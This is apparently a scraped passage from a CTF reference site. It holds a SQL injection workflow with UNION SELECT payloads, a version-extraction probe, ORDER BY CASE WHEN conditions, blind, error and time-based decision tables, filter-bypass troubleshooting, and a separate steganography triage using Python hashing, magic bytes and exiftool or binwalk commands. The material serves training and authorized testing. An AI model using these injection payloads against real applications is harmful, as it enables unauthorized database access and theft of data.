Find a displayed text-compatible column no_such_value' UNION SELECT 'CTFMARK',NULL,NULL-- - no_such_value' UNION SELECT NULL,'CTFMARK',NULL-- - no_such_value' UNION SELECT NULL,NULL,'CTFMARK'-- -Change one position at a time. An integer column may reject a string on PostgreSQL, SQL Server, or Oracle. NULL is often a better starting placeholder than integers. The app may render only the first row or a particular field.
Put the engine expression in that position no_such_value' UNION SELECT NULL,sqlite_version(),NULL-- -Now follow the matching page:
MySQL · PostgreSQL · SQLite · SQL Server · Oracle
5. No visible output? Signal Next action Rows / JSON fields displayed UNION read A stable true/false page difference Boolean extraction Detailed DB error body Error-based extraction if supported Only repeatable conditional delay Time-based extraction Immediate request looks safe, later export fails Second-order injection Continue with blind / error SQLi. Stacked queries depend on both the database and the application driver. A database supporting semicolons does not mean the application accepts multiple statements.
6. Nonstandard insertion points ORDER BY If source shows an unquoted sort expression and you can observe the first row:
CASE WHEN (1=1) THEN name ELSE id END CASE WHEN (1=2) THEN name ELSE id ENDThis depends on compatible types; use two same-type columns or engine-appropriate casts. An allowlisted column name prevents this. A trailing UNION usually does not fit this position.
LIKE wildcard behavior % matches multiple characters and _ matches one in SQL LIKE patterns. Broadening search using % alone can be normal intended wildcard behavior; it does not establish SQL syntax injection.
Second order Store a unique quote-bearing marker in a profile/product/name, then exercise reports, exports, searches, admin pages, and jobs that reuse it. Record the downstream request that actually executes the query. An escaped INSERT does not protect a later string-built SELECT.
If the payload fails Symptom Check next near UNION / unexpected ) String/parenthesis closure Column-count error UNION column count Type conversion error Text-compatible slot / explicit cast No injected row Original result ordering, renderer, negative base value Comment appears ineffective MySQL trailing space, stripped whitespace, newline, URL encoding Same page for true/false Wrong parameter, missing session, no baseline row, cached response Blocked keywords Encoding / filter transformations Reference: PortSwigger SQLi syntax comparison. Use it to cross-check syntax; the sequence here is a manual decision workflow.

title: First 10 Minutes
content:
Steganography triage Do the cheap structural checks before broad guessing. Preserve the original bytes; every transformation goes into a new file.
1. Record and classify Standard-library Python works even when a dedicated file/hash utility is unavailable:
from pathlib import Path import hashlib p = Path("challenge.bin") h = hashlib.sha256() with p.open("rb") as stream: head = stream.read(32) h.update(head) for block in iter(lambda: stream.read(1024 * 1024), b""): h.update(block) print("size", p.stat().st_size, "head", head.hex(), "sha256", h.hexdigest()) Starting bytes Candidate 89 50 4e 47 0d 0a 1a 0a PNG ff d8 ff JPEG 47 49 46 38 37 61 / 47 49 46 38 39 61 GIF 42 4d BMP 50 4b 03 04 ZIP member; DOCX/PPTX/XLSX are ZIP containers too 25 50 44 46 2d PDF 52 49 46 46 .... 57 41 56 45 RIFF/WAVE; confirm bytes 8–11 are WAVE 1f 8b 08 gzip candidate fd 37 7a 58 5a 00 xz candidate A signature is not enough: confirm the format with a matching parser. Do not rename random bytes and call them an image repair.
2. Metadata, strings, signatures exiftool -a -u -g1 challenge.png strings -a -n 6 -t x challenge.png xxd -l 128 challenge.png binwalk challenge.pngstrings -t x prints hexadecimal offsets. Keep number bases explicit when carving. Binwalk output depends on the installed major version; use its detection result as a hypothesis, then validate a selected payload instead of blindly recursively extracting everything.
Metadata fields worth reading: comments, author/artist, description, software, embedded thumbnails, GPS, custom tags, document properties and filenames. A password-looking value may unlock a later layer; preserve its exact case and punctuation.
3.
